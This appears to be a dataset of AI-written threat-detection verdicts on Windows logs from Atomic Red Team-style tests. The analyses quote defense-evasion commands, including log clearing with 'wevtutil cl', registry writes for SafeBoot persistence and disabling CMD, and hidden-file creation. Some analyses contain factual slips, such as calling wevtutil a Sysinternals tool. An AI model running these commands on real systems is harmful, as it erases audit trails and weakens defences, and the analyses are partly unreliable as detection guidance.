- **Resolution**: **MALICIOUS**

The logs indicate a high probability of malicious activity based on the combination of registry modification for credential leakage, log clearing attempts, and atypical process behaviors. 

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate `Server002` from the network to prevent any lateral movement or further compromise of the system.
   - Conduct a full forensic analysis on the machine to identify additional traces of the attacker's presence, persistence mechanisms, and any data exfiltration activities.

2. **Credential Reset:**
   - Reset credentials for all users, particularly focusing on admin_test and any other users active on the server.
   - Consider additional security controls like MFA where possible.

3. **System and Security Audit:**
   - Review system and security configurations, particularly for WDigest and credential protection mechanisms.
   - Evaluate logging mechanisms and ensure that they are protected against tampering or unauthorized access.

4. **Threat Hunting:**
   - Investigate other connected systems for similar patterns or indicators of compromise to ensure a wider network threat assessment.

5. **Increase Monitoring:**
   - Implement tighter monitoring and anomaly detection to capture unusual behavior more effectively in the future.

Addressing these points swiftly and thoroughly can minimize risk and prevent further breaches."
Deobfuscate-Decode Files Or Information,"Upon analyzing the provided Windows event logs, the following suspicious activities have been identified:

1. **Log Clearing Events:**
   - There are multiple instances of logs being cleared in quick succession (Event IDs 104 and 1102), with the user account ""admin_test"" being responsible. This action is often indicative of an attempt to cover up tracks after malicious activity, as legitimate users typically have no reason to clear logs so frequently, especially across different channels such as System and Security.

2. **Usage of `wevtutil.exe`:**
   - The process `wevtutil.exe`, which is used to manage event logs on Windows, was executed multiple times by the user ""admin_test"" to clear different logs including ""System"", ""Application"", and ""Windows PowerShell"". The command line used indicates an explicit attempt to clear logs: `wevtutil.exe cl <log_name>`. This further supports the suspicion regarding log tampering.

3. **Execution of `cmd.exe` with `certutil.exe`:**
   - A command line process executed `certutil.exe` to encode and subsequently decode a file (`calc.exe`) stored temporarily. Such use of `certutil.exe` is commonly associated with malicious activities, including data exfiltration or staging for payload execution. Moreover, the decoding of the potentially modified executable raises red flags about possible unauthorized code execution.

4. **Privileges and Logon Activities:**
   - Events demonstrating elevated privileges (Event ID 4672) were recorded for ""admin_test"", which may suggest privilege escalation attempts if not justified by legitimate admin activities around the same timeframe as suspicious events.
   - A logon session (Event ID 4624) was recorded with the NTLM protocol from a workstation ""DESKTOP-3HL5B2P"", which should be verified for legitimacy considering the timing and context of other suspicious actions.

Given the above points, the behavior observed in the logs aligns with common malicious activities including log tampering, possible privilege escalation, and suspicious command-line executions possibly aiming to bypass security controls or execute unauthorized code.

**Resolution: MALICIOUS**

Guidance on how to proceed:
- **Containment:** Immediately isolate the affected host (""Server002"") from the network to prevent further malicious actions.
- **Investigation:** Conduct a thorough forensic analysis on ""Server002"" to recover any cleared logs, identify the origin of suspicious processes, and investigate any potentially unauthorized access points.
- **Remediation:** Reset credentials for the compromised account ""admin_test"" and review privilege assignments to ensure the principle of least privilege.
- **Monitoring:** Enhance monitoring across the network to detect similar log clearing or execution activities early, and implement alerts for unusual `certutil.exe` usage.
- **Review:** Check other machines in the network for similar activity patterns and apply appropriate security patches and configurations."
Lolbas ie4uinit.exe use as proxy,"Upon analyzing the provided logs, several findings indicate potentially malicious behavior, requiring further attention:

1. **Sysmon Entries**: 
   - The frequent execution of `wevtutil.exe` with the command line `cl` for different logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`) indicates an attempt to clear or manage event logs. This tool usage by `SERVER002\\admin_test` is suspicious, especially since it coincides with events that clear logs.
   - Creation of a temporary file (`ie4uinit.exe`) and its subsequent execution from the `%TEMP%` directory is a known technique known as hosting a legitimate executable with potentially malicious intent (T1218). This, coupled with the command `ie4uinit.exe -BaseSettings`, raises a red flag about potentially malicious payload execution.

2. **Security Log Entries**: 
   - Event ID 1102 indicates the security log was cleared, which is a common tactic used to cover tracks. The action was performed by the user `admin_test`, which further suggests internal misuse or a compromised account.
  
3. **System Log Entries**:
   - Event ID 104, indicating the clearance of event logs for 'System' and 'Windows PowerShell', again performed by `admin_test`, supports the hypothesis of trace-covering activities.

4. **Command-line Usage**:
   - Frequent utilization of `cmd.exe` to copy and execute files from temporary paths strengthens the suspicion of the system being used to conduct activities meant to hide or obfuscate actions.

5. **Account Activity**:
   - The logs feature multiple high-privileged activities executed under `SERVER002\\admin_test`, which may indicate either intentional misuse or a hacker gaining control over an administrative account.

Overall, analysis indicates that actions were deliberately made to cover activities (log clearing with `wevtutil.exe` and direct log deletions), coupled with the execution of known suspicious techniques involving temporary directories and a known Windows executable used frequently by adversaries for argument abuse.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Isolate the affected system immediately to prevent further spread or data exfiltration.
- Conduct a thorough forensic investigation to identify the full scope of the breach.
- Review and enhance endpoint security measures to detect similar future activities.
- Change all administrative credentials and review access permissions.
- Engage incident response procedures and, if needed, legal or recovery services.
- Analyze the network for potential lateral movement and ensure other devices are not compromised."
Odbcconf.exe - Execute Arbitrary DLL,"Upon reviewing the provided Windows event logs, the following notable observations are made:

1. **Event Log Clearing**: 
   - Multiple instances of event log clearing, including system, security, and Windows PowerShell logs, are observed. These are often indicative of attempts to obfuscate actions from system administrators or other monitoring processes.
   - Security log was cleared (EventID: 1102) by the user `admin_test`. Similarly, system logs (EventID: 104) and Windows PowerShell logs were cleared. This behavior is highly suspicious as it may indicate an attempt to hide malicious activity.

2. **Use of PowerShell and System Utilities**:
   - The execution of `wevtutil.exe` with command lines to clear various system logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, System, Security, and Windows PowerShell) appears repeatedly associated with the user `admin_test`. This behavior is often associated with malicious actors covering their tracks.
   - We also see a suspicious process execution involving `odbcconf.exe` with the command registration of a DLL, which can potentially be a sign of DLL hijacking or loading a malicious DLL.

3. **High Integrity Commands**: 
   - The integrity level of the commands executed is noted to be `High`, indicating administrative privileges were used. This is not inherently malicious, but combined with log clearance activity, it raises suspicion.
   - Processes like `cmd.exe` executing with unusual command-line arguments (e.g., involving DLL registration in temporary directories) further suggest potential unauthorized system changes.

4. **Use of Common Windows Utilities**:
   - `whoami.exe` and `HOSTNAME.EXE` are run, which may indicate system reconnaissance activity. While common in legitimate scenarios, their usage during the activity window raises questions when paired with the log clearing events.

5. **Admin User Activity**:
   - All suspicious activities were performed by the `admin_test` user, which could either mean this account is compromised or the user is conducting unauthorized actions knowingly.

**Assessment:**
The combination of event log clearing, suspicious system utility executions, use of high integrity commands, and consistent association with a single user suggests that the host has likely been compromised or involved in unauthorized activity. Monitoring tools like Sysmon logged concerning behavior indicative of potential breach tactics.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediate actions should be taken to investigate the `admin_test` account, including changing password credentials and checking for unauthorized access. 
- Conduct a thorough forensic investigation to identify the scope of any potential compromise and identify any malware or unauthorized changes.
- Review all logs across other systems to ensure the suspicious activity is isolated to this host.
- Consider isolating the host (Server002) from the network to prevent further potential spread or interaction with other network resources.
- Audit and review all privileged user activities and implement stricter monitoring and alerts for log clearance activities to detect in real-time. 
- Keep forensic images of the system and related logs for detailed post-incident analysis."
HTML Smuggling Remote Payload,"After analyzing the provided Windows event logs, the following observations and assessments are made:

1. **Windows Event Logs Clearing**:
    - There are several events in the System log (Event ID 104) and Security log (Event ID 1102) indicating that the log files were cleared, attributed to user ""admin_test"". Clearing event logs is generally suspicious behavior because attackers often do this to cover their tracks after unauthorized activities. The use of `wevtutil` to clear logs, as seen in the Sysmon logs, further corroborates this action.

2. **Use of PowerShell**:
    - The PowerShell logs and Sysmon logs indicate the execution of PowerShell with the command line `powershell.exe & {& \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1027.006\\bin\\T1027_006_remote.html\""}`. This appears to be associated with the Atomic Red Team framework, which is used for security testing and simulating adversary behavior. Although this is commonly used for legitimate testing purposes, in this context, it may indicate that a simulation or real attack scenario was activated.

3. **Execution of External Resources**:
    - Sysmon logs show several executions of `msedge.exe` with arguments to open or handle files in the directory `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1027.006\\bin\`. This indicates the execution of possibly obfuscated or potentially malicious activities, given that T1027.006 is a technique for obfuscated files or information which can be indicative of advanced evasion tactics.

4. **Integrity Levels and Elevated Privileges**:
    - The presence of high integrity levels and the execution of processes such as `svchost.exe` under the `NT AUTHORITY\SYSTEM` account can be typical, but in combination with other behaviors, like the log clearance and PowerShell activity, it needs careful interpretation. The use of elevated privileges could be a method to gain unauthorized access.

**Conclusion and Resolution**:
- **Resolution**: **SUSPICIOUS** - The activities observed contain multiple aspects typically associated with malicious activity, such as log clearing, PowerShell execution with potentially obfuscated commands, and use of elevated privileges.
- **Recommended Action**: Further investigation is required to confirm whether these actions were part of a legitimate security exercise (such as a Red Team operation) or indicate unauthorized access and potential compromise. Implement tighter logging and monitoring, validate with involved personnel if these activities were intentional for security testing, and ensure systems are hardened against unauthorized log clearing and PowerShell execution."
Bypass UAC using Fodhelper - PowerShell,"After reviewing the provided logs, there are several indicators of suspicious and potentially malicious activity that warrant further investigation:

1. **Event Log Clearing**:
   - **Event ID 1102** in the Security log and **Event ID 104** in the System log indicate that the event logs were cleared. This action, often performed using ""wevtutil.exe cl"", is suspicious when executed by an atypical user account or at an unusual time. In this case, it was cleared by the user ""admin_test"", which could be indicative of an attempt to cover tracks of malicious activity.

2. **Suspicious PowerShell Script**:
   - The PowerShell logs show the execution of a script that is attempting to exploit a UAC bypass using `fodhelper.exe`. This technique involves creating keys and modifying the registry path to launch a command with elevated privileges without triggering a UAC prompt, which is a common method used by attackers to escalate privileges.

3. **High Privilege Logon Session**:
   - **Event ID 4624** with logon type 5 (service startup) for the ""SYSTEM"" user is typical in a system environment. However, the context and correlation with other events need to be examined, particularly considering the attempt at privilege escalation.

4. **Privileged Access and Activity**:
   - **Event ID 4672** indicates that the ""SYSTEM"" account exercised a series of high-level privileges during the session. While common for SYSTEM accounts, the timing and surrounding activity make it suspicious.

5. **Sysmon Events**:
   - Numerous Sysmon entries record the execution of ""wevtutil.exe"" to clear logs and processes like ""cmd.exe"", ""powershell.exe"", and ""conhost.exe"" under high integrity levels, supporting the evidence of attempts to manipulate system processes and logs.

Based on the analysis of the logs:

- The sequence of log clearing, use of PowerShell scripts to modify the registry and run `fodhelper.exe`, coupled with the high-level privileges being utilized and the timing of these actions, highly suggests malicious intent.

**Resolution: MALICIOUS**

**Guidance**:
- Conduct a full endpoint investigation on ""Server002"", focusing on recent modifications to the registry, the presence of unauthorized scripts or executables, changes in user permissions, and potential lateral movement.
- Isolate the machine immediately to prevent further propagation if an attacker still has access.
- Review access logs across other systems to check for similar patterns or compromised accounts.
- Restore cleared logs from backups to gather additional context around these activities.
- Consider performing a complete audit and potential re-imaging of the affected system for security assurance."
Lolbin Jsc.exe compile javascript to exe,"**Analysis of the Windows Event Logs:**

Upon reviewing the logs, the following activities stand out as suspicious and potentially indicative of malicious behavior:

1. **Clearing of Event Logs:**
   - Multiple entries indicate that system logs, including the System log, Windows PowerShell log, and Security log, were cleared by the user ""admin_test"". This is generally considered suspicious unless performed as a known administrative task because attackers often clear logs to cover their tracks.
   - Relevant events:
     - System Log Cleared by ""admin_test"" (Event ID 104)
     - Security Log Cleared by ""admin_test"" (Event ID 1102)

2. **Usage of `wevtutil`:**
   - The `wevtutil` command was used to clear logs. This utility is used to manage event logs and is a command-line operation that does not usually occur frequently in normal operations.
   - Process execution events show `wevtutil.exe` being run with commands indicative of log clearing activities.

3. **PowerShell Execution:**
   - PowerShell was executed (`powershell.exe`), which is another vector commonly used in attacks for script execution. While the logs don't detail the exact commands executed, the presence alongside other suspicious activities elevates concern.
   - Event ID 5 in the Sysmon log confirms execution with `SERVER002\admin_test`.

4. **Use of `cmd.exe` and Scripting Compilers:**
   - A `cmd.exe` process executed a command to copy a script (`hello.js`) and compile it using the .NET framework (`jsc.exe`). The compilation of scripts like this can be used to execute more complex code, possibly suggesting attempts to run arbitrary or malicious scripts.
   - Indicative of possible unauthorized or abnormal script execution.

5. **Use of `whoami` and `hostname`:**
   - The use of utilities `whoami.exe` and `hostname.exe` indicates someone might be gathering system information, which can be part of the reconnaissance phase of an attack.

**Assessment:**
The combination of log-clearing actions, execution of `wevtutil`, abnormal PowerShell, and command line activity strongly suggests the possibility of unauthorized or malicious activity. These actions are consistent with attempts to remain undetected while potentially escalating privileges or executing unauthorized scripts.

**Resolution: SUSPICIOUS**
Given the log-clearing, command execution, and potential script compilation without provided context or justification, further investigation is essential. Verify with the user (`SERVER002\admin_test`) for any legitimate rationale behind these operations and check for any deviations in planned activities. Consider a more detailed analysis of network activity and user permissions to identify any additional patterns of compromise."
Disable Windows CMD application,"The analysis of the provided logs indicates the presence of suspicious and potentially malicious activities occurring on the Windows machine ""Server002"". Here is a breakdown of noteworthy events flagged within the logs:

### Malicious Indicators:

1. **Event Log Clearing**:
   - Security Event ID 1102 (Event Log Cleared) and System Event ID 104 show that event logs (including security and system logs) were cleared by the user `admin_test`. This action is commonly associated with attempts to cover tracks after conducting malicious activities.

2. **Suspicious PowerShell Activity**:
   - There is evidence of PowerShell execution with the command: `New-ItemProperty -Path ""HKCU:\Software\Policies\Microsoft\Windows\System"" -Name DisableCMD -Value 1`. This command is often used by attackers to disable CMD for certain users to control system capabilities or prevent detection. The execution of this command with a high integrity level and by the user `admin_test` is concerning.

3. **Time Manipulation**:
   - Security and System logs show an adjustment in the system time (Event ID 4616) executed by svchost. This behavior could be indicative of an attempt to manipulate log timestamps to obscure other activities.

4. **High-Integrity Operations by Non-System Users**:
   - Several processes, such as `whoami.exe`, `wevtutil.exe`, and `conhost.exe`, were executed with high integrity levels by `admin_test`. The use of `wevtutil` with commands targeting various event logs suggests attempts at log manipulation or investigation.

5. **Authentication Events**:
   - The Security log shows a Logon event (ID 4624) for SYSTEM via `Advapi` which aligns with processes executed under NT AUTHORITY\SYSTEM, not uncommon, but must be cross-referenced with other activity to ascertain legitimacy.

### Assessment:
Given the presence of event log clearing, suspicious PowerShell use, time manipulation, high-level executions by non-system processes (all actions characteristic of malicious actors attempting to obfuscate activities), and suspicious logon entries, the combination of these findings suggests a significant risk of malicious activity on the host.

### Resolution:
- **MALICIOUS**: The logs contain clear malicious indicators such as log tampering, privilege abuse, and registry modification. Immediate actions should be taken to isolate the host from the network to prevent further exploitation or lateral movement.

### Recommended Actions:
1. **Immediate Isolation**: Disconnect the machine from the network to prevent any potential data exfiltration or spread of compromise.
2. **Full Forensic Investigation**: Conduct a detailed forensic analysis, focusing on unauthorized access points, persistence mechanisms, and potential data breaches.
3. **Identity & Access Management**: Review all administrative access logs and user privileges, emphasizing any recent changes or anomalies.
4. **Patch & Update**: Ensure the system is up to date with the latest security patches and software updates.
5. **Post-Incident Review**: Implement additional monitoring and security measures to prevent similar incidents in the future, such as enhanced logging and alerting for suspicious activities."
LockBit Black - Disable Privacy Settings Experience Using Registry -cmd,"Upon reviewing the provided log entries, a few suspicious activities can be noted:

1. **Log File Clearing:**
   - In the Security log, Event ID 1102 indicates that ""admin_test"" cleared the security log at `2024-10-28 09:29:08.1586224` (UTC). The clearing of logs is suspicious, particularly by an admin account, as it can be indicative of an attempt to cover malicious activity.

2. **Use of `wevtutil.exe`:**
   - The Sysmon log shows multiple instances of `wevtutil.exe` being used to clear event logs (`wevtutil.exe cl Security`, `wevtutil.exe cl System`, etc.). This behavior corresponds with the clearing events in the Security and System logs. Wevtutil is a legitimate utility, but it is often used by attackers to delete logs and cover tracks.

3. **Registry Manipulation:**
   - Sysmon Event shows `cmd.exe` executing a command to modify registry keys under the user ""SERVER002\\admin_test,"" with the command `\""cmd.exe\"" /c reg add \""HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f`. This registry modification may serve to impede privacy or logging controls, a tactic used to maintain persistence or conceal an attacker’s activities.

4. **Time Synchronization Events:**
   - The System log reflects time-change events with Event IDs 1 and 24 related to `svchost.exe`, which might point to an attempt to alter timestamps for masking activities.

**Assessment:**
Based on the observed events, especially log clearing and registry manipulation by an admin account and the use of `wevtutil.exe` and `cmd.exe` to perform potentially malicious activities, these actions indicate more than mere suspicious behavior. Such patterns are often associated with attempts to obfuscate a trail of malicious activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the server (Server002) from the network to prevent further potential damage or data exfiltration.
- Conduct a comprehensive forensic analysis of the affected system to determine the extent of the compromise and how the unauthorized actions were initiated.
- Review access logs and user activities associated with ""admin_test"" to investigate potential insider threats or credential misuse.
- Change all relevant credentials and enforce stricter access controls and logging.
- Enhance monitoring for similar activities on other systems within the network to detect any further propagation of malicious activity."
LockBit Black - Unusual Windows firewall registry modification -cmd,"Upon reviewing the provided event logs, several actions indicate potential suspicious and malicious activity:

**Indicators of Suspicious Activity:**

1. **Event Log Clearing**:  
   - Numerous Sysmon and Windows event log events show that the `wevtutil` tool was used to clear event logs (`cl` command). This is executed by the `admin_test` user on Server002, which is typically seen as an attempt to cover tracks after illicit activity. Logs were cleared for channels: Application, System, and Security.

2. **Disabling of Firewall**:
   - A command was executed via `cmd.exe` to disable the Windows Firewall on certain profiles. The command executed with high integrity by `admin_test` user is a definitive red flag as it can indicate the intention to lower the system's defenses.

3. **Elevation of Privileges**:
   - The presence of Event ID 4672 indicates that `admin_test` received special privileges which include sensitive security permissions like `SeDebugPrivilege`, `SeBackupPrivilege`, and others that allow significant access to system components.

4. **Suspicious Command Execution**:
   - The use of PowerShell and hostname-related commands like `HOSTNAME.EXE` and `whoami.exe` in rapid succession could indicate reconnaissance techniques to gather environment-specific details.

**Assessment**:  
The combination of clearing event logs, disabling the firewall, and the use of privilege escalation indicates that these activities are consistent with unauthorized or malicious behavior. Event log clearing is commonly associated with attempts to hide malicious activity or system administration actions that shouldn't be monitored. Disabling the firewall is a direct attempt to weaken the system's security posture.

**Resolution**: MALICIOUS

**Guidance**:
1. **Containment**: Immediately isolate the affected host (Server002) from the network to prevent further malicious activity.
2. **Investigation**: Perform a deeper forensic analysis to identify any malicious payloads or further details about activity on the host. Verify the legitimacy of the `admin_test` account usage and whether it has been compromised.
3. **Remediation**: 
   - Restore any system logs and configurations altered during the incident (like firewall settings).
   - Apply patches and improve security monitoring (particularly for the use of `wevtutil`, `cmd`, and PowerShell).
4. **Review Privileges**: Reassess the privileges assigned to the `admin_test` account and ensure least privilege principle is enforced.
5. **User Awareness**: Enhance user education on recognizing and preventing security threats, especially regarding account least privileges and network policies.

This thorough investigation should help in mitigating current threats and strengthening future defenses."
InstallUtil evasive invocation,"Upon careful analysis of the provided Windows event logs, several activities stand out as potentially suspicious or indicative of malicious activity:

1. **Unusual Use of PowerShell**: 
   - Multiple instances of PowerShell usage are noted with complex command-line arguments. One particular instance involves PowerShell executing a script called `InstallUtilTestHarness.ps1` from a temporary folder associated with AtomicRedTeam, a known security testing framework that simulates various techniques employed by threat actors to test defensive measures (MITRE ATT&CK). This could potentially indicate someone testing or simulating attack techniques in a live environment.

2. **Clearing of Event Logs**:
   - The logs show the clearing of security, system, and PowerShell logs shortly after the execution of PowerShell scripts. This is a known behavior to conceal malicious operations and indicates an attempt to hide activities from an investigation.

3. **Use of Utilities like `wevtutil.exe`**:
   - The execution of `wevtutil.exe` command-line utility to clear event logs as well (Event IDs: 17962, 17966, 17970, 17974, 17978) further corroborates an effort to cover tracks.

4. **Execution of .NET and Compilers**:
   - Various .NET assembly utilities (`csc.exe` and `cvtres.exe`) were executed from temporary directories (Event IDs: 17992, 17993, 17996, 17997). This is unusual as these tools are often used by developers or may indicate the drop or execution of compiled malicious binaries.

5. **Use of `InstallUtil.exe`**:
   - There is evidence of the use of InstallUtil performed in an evasive manner within specially crafted paths, which is a known method for executing malicious assemblies hidden from typical execution paths (Event ID: 18000). Coupled with the PowerShell logs, this indicates an attempt at malicious persistence or execution.

6. **Clearing `Windows PowerShell` and `System` Logs**:
   - Log entries show that both Windows PowerShell and System logs were cleared, which is usually done to hide actions taken on a system.

**Assessment**:
The synchronized execution of PowerShell scripts with potentially malicious intent, coupled with the clearing of log files indicates a high likelihood of compromise. These activities are consistent with tactics used to stage and execute attacks while evading detection.

**Resolution**: MALICIOUS

**Guidance**:
Immediate actions should be taken:
- Isolate the affected host from the network to prevent further malicious activities or lateral movement.
- Preserve and save all logs and data for further forensic analysis.
- Conduct a comprehensive forensic investigation to identify all compromised systems and data breaches.
- Review access permissions and policies to tighten security and reduce the attack surface.
- Notify relevant stakeholders, including IT security and compliance teams, to initiate further remediation steps and reporting procedures."
Snake Malware Encrypted crmlog file,"After thoroughly analyzing the provided Windows event logs, I have identified several points of interest and potential indicators of suspicious activity:

1. **Command Execution with Elevated Privileges**: 
   - There are multiple instances of the use of `wevtutil.exe` to clear event logs (`EventID 104` in the System log and `EventID 1102` in the Security log). 
   - The `wevtutil.exe` is executed several times with high integrity levels by the user `SERVER002\admin_test`. Clearing event logs can be an indicator of malicious activity if done without a legitimate purpose.

2. **Use of PowerShell for File Operations**:
   - There is a PowerShell command used to create a hidden file: `& {$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \""File created: $($file.FullName)\""}`.
   - The use of PowerShell to create hidden files with these attributes can be indicative of malicious behavior, such as preparing for persistence or hiding indicators of compromise.

3. **Repeated Execution of System Utilities**:
   - The logs show frequent execution of system utilities like `whoami.exe`, `hostname.exe`, and `conhost.exe`. While these can be benign, repeated execution might indicate that a script or malicious actor is executing several commands in rapid succession, possibly for reconnaissance or system monitoring.

4. **Logon Sessions and Privileged Task Execution**:
   - Activity predominantly involves the account `SERVER002\admin_test` which consistently operates with high privileges. Given the context of logfile clearing, this suggests possible unauthorized or suspicious usage of an administrative account.

5. **Normal Update and Task Execution Processes**:
   - Some events show routine operations like Windows updates (`wuauclt.exe`), Microsoft Edge Update, and antivirus updates (`AM_Delta.exe`, `MpSigStub.exe`), which are typically benign and expected on a Windows system.

Based on the analysis of these logs: 
- The use of `wevtutil.exe` to clear logs and the PowerShell command for creating hidden files are patterns often associated with malicious activity.
- The presence of legitimate background tasks like update processes suggests some normal activity.

**Resolution: SUSPICIOUS**

This activity warrants further investigation. It is recommended to:
- Verify the legitimacy of the actions performed by `SERVER002\admin_test`.
- Investigate the purpose and origin of the PowerShell script that created the hidden file.
- Review the system for additional signs of compromise, such as unauthorized access to sensitive information, or unexplained network traffic.
- Increase monitoring on the system to quickly identify any further suspicious activities."
Set a firewall rule using New-NetFirewallRule,"The logs provided for analysis reveal a series of activities that signal potential malicious behavior. Here's a detailed assessment based on the logs:

1. **Log Clearing Events**: 
   - Multiple logs, including the System, Windows PowerShell, Security, and Sysmon logs, have been cleared (`EventID: 104` and `EventID: 1102`). These were cleared by a user with the username `admin_test`. Log clearing activity is often associated with malicious actors attempting to cover their tracks after compromising a system.

2. **Command-Line Utilities**: 
   - The `wevtutil.exe` command, which is used to clear event logs, appears multiple times within the logs (`Sysmon EventID: 1`). Clearing logs using `wevtutil.exe` executed by the `admin_test` account signifies potential malicious activity as it might be used to delete logs and erase evidence of the attacker's activities.

3. **Suspicious PowerShell Command**: 
   - A PowerShell command was executed to create a new firewall rule allowing inbound traffic on port 21 (`FTP`) with a `New-NetFirewallRule` command. Leveraging PowerShell to manipulate firewall settings, especially to allow traffic on a less commonly used port like 21, could indicate an attempt to open a backdoor or management interface for further exploitation.

4. **Time Change Event**: 
   - The system time was altered (`EventID: 4616`). While this alone is not specifically indicative of malicious behavior, it's atypical and could be used to manipulate timestamps on logs, which coincides with attempts to obscure malicious activities.

5. **Unusual Administrative Account Activity**:
   - All suspicious activities were performed using the `admin_test` account, and this activity was conducted with high integrity level access. This indicates potential misuse of administrative privileges.

Combining these observations, we can see a pattern of activity consistent with attempts to hide actions on the system (through log clearing and potential backdoor setup via firewall rules modification). The behavior is indicative of compromise or attempted compromise of the system.

**Resolution**: MALICIOUS

**Guidance**:
- Investigate the `admin_test` account for unauthorized access or compromise.
- Review firewall configurations for any unexpected or unauthorized rules, particularly on port 21.
- Conduct a full security audit and forensic investigation to identify any additional unauthorized access or changes.
- Apply security patches or configuration adjustments as needed to secure the system and prevent further unauthorized actions."
Disable Windows OS Auto Update,"After reviewing the provided Windows event logs, a few significant events stand out, which could indicate suspicious or malicious activity:

1. **Event Log Clearing**: 
   - Multiple instances of the event `EventID 104` indicating that event logs for ""System,"" ""Windows PowerShell,"" and ""Security"" channels have been cleared. This is typically unusual and may indicate an attempt to cover tracks of malicious activity.

2. **Process Creation Involving `wevtutil.exe`**:
   - The process `wevtutil.exe`, which is used to manage Windows Event logs, was executed multiple times (`Sysmon EventID 1`) with a command line `cl` (clear) followed by different event logs such as ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell."" This reinforces the suspicious behavior related to event log clearing.

3. **Registry Modification via `cmd.exe`**:
   - A command was executed (`Sysmon EventID 1`) that modified the registry to disable automatic updates (`HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU"" /v ""NoAutoUpdate""`). Registry changes to disable updates, especially through a command-line interface, is often a tactic employed by adversaries to maintain persistence on a system without interference from security updates.

4. **Edge Update Activity**:
   - Numerous processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) were recorded, which is expected behavior for keeping software updated. However, in this context of log clearance and unauthorized registry modifications, if combined with unusual timing or execution context, it might need further review, but alone it doesn't indicate definite malicious intent.

**Assessment**:
- The combination of cleared logs, registry modifications, and specific utility executions (`wevtutil`) aligns with tactics often seen in system compromise and data breach situations where an attacker may be trying to cover their tracks and secure persistence.

**Resolution: SUSPICIOUS**:
- The activity observed in the events suggests unusual behavior that aligns with known malicious actions like event log clearing and disabling updates, indicating potential malicious intentions.
  
**Guidance**:
1. **Conduct a Detailed Investigation**: Initiate a thorough investigation into the user activity associated with `admin_test` as the same user ID is involved in suspicious log clearing actions.
   
2. **Isolate the Host**: Consider isolating the affected system from the network if deemed necessary based on further investigation to prevent potential spread or further actions by any malicious actors.

3. **Review Registry and File System**: Examine registry changes, particularly around the Windows Update settings, and verify the integrity of system and important application files.

4. **Log Monitoring and Alerting**: Enhance monitoring on similar events and set up alerts for suspicious process executions, particularly those involving security utilities (`wevtutil`, `cmd.exe` for registry changes).

5. **Check for Persistence Mechanisms**: Examine the system for common persistence mechanisms and unauthorized scheduled tasks or services.

This situation warrants further analysis and a prudent, cautious approach to determine the full scope and intent of the suspicious activities observed in these logs."
Windows Add Registry Value to Load Service in Safe Mode with Network,"Upon analyzing the provided Windows event logs, several patterns and events stand out, suggesting the presence of potentially malicious activity. Here is a detailed breakdown:

1. **Clearing Event Logs:**
   - The logs indicate multiple attempts to clear various system event logs (Security EventID 1102, System EventID 104). Specifically, logs show that the 'admin_test' user cleared the ""Security"" log (EventID 1102) and other logs such as ""System"" and ""Windows PowerShell"" using the wevtutil command.

2. **Suspicious Command Execution:**
   - The ""cmd.exe"" process executed a command to modify the registry, adding a key related to SafeBoot, which is a rare and potentially malicious action as it might be used for persistence or avoiding detection (`EventID 1`). The command executed is: 
     ```plaintext
     ""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AtomicSafeMode"" /VE /T REG_SZ /F /D ""Service""
     ```

3. **Use of Sysinternals Tools:**
   - Multiple executions of `wevtutil.exe`, an event log management utility, were detected. While this activity could be benign in certain contexts (like routine maintenance), it can also suggest an attempt to cover tracks by clearing logs, especially when correlated with the simultaneous clearing of event logs.

4. **Execution of 'whoami' and 'hostname' Commands:**
   - The execution of `whoami.exe` and `hostname.exe` is noted (`EventID 1`). These could be considered reconnaissance actions, commonly used to gather system information during an attack.

5. **Edge Update Processes:**
   - There are numerous entries related to the Microsoft Edge Update process which appears normal at first glance, given the context of Edge updating itself. However, they are not directly linked to the suspicious behaviors above.

6. **Time Manipulation:**
   - There is possible tampering with system time, as indicated by the repeated presence of security events adjusting system time (Windows EventID 4616). Unusual time adjustments can indicate attempts to manipulate logs or system integrity.

**Assessment:**
The actions taken by the 'admin_test' user, such as clearing event logs and attempting to add a registry key related to SafeBoot mode, are strong indicators of suspicious and potentially malicious activity. These actions align with common tactics used by threat actors to cover their tracks and establish persistence on the system.

**Recommendation:**
- **Resolution:** **MALICIOUS**
- Immediate remediation steps should include:
   - Isolating the affected system to prevent further potential lateral movement within the network.
   - Conducting a full investigation to identify any additional compromised systems or accounts.
   - Reviewing access permissions for the user 'admin_test' and resetting account credentials.
   - Restoring cleared logs if possible and employing enhanced monitoring for unusual activities.

These measures should help mitigate the identified threat and safeguard the network environment."
Create Windows Hidden File with powershell,"## Analysis of Windows Event Logs

### Anomalous Behavior and Indicators

1. **Clearing of Event Logs (Security, System, and Windows PowerShell logs)**
   - **Event ID 1102** in the Security log indicates that the security event log was cleared by a user with the username ""admin_test"". This action can often be indicative of an attempt to cover tracks, especially if the account holder was involved in suspicious activities.
   - Similarly, **Event ID 104** in the System and Windows PowerShell logs indicate these logs were also cleared by ""admin_test"". Clearing system logs is a strong indicator of malicious intent, potentially to hide unauthorized activities.

2. **Process Execution with Suspicious Command Lines**
   - Multiple occurrences of **cmd.exe** instances executing commands aimed at checking for or modifying the attributes of a file named `T1564.001-9.txt`. The file is likely indicative of an obfuscation or hiding strategy, consistent with the MITRE ATT&CK tactic T1564 (Hide Artifacts). 
   - Execution of **wevtutil.exe** with the command line arguments intended to clear (cl) various event logs (e.g., Microsoft-Windows-Sysmon/Operational, Application, Security). This further corroborates an intent to remove traces of activity.
   - **PowerShell Log Manipulation** using commands that hide file attributes reinforces the malicious nature of activities. PowerShell was used to hide file attributes in a user's temporary directory, which is commonly associated with maintaining persistence or evasion techniques.

3. **High-Integrity Level Processes Executed by User**
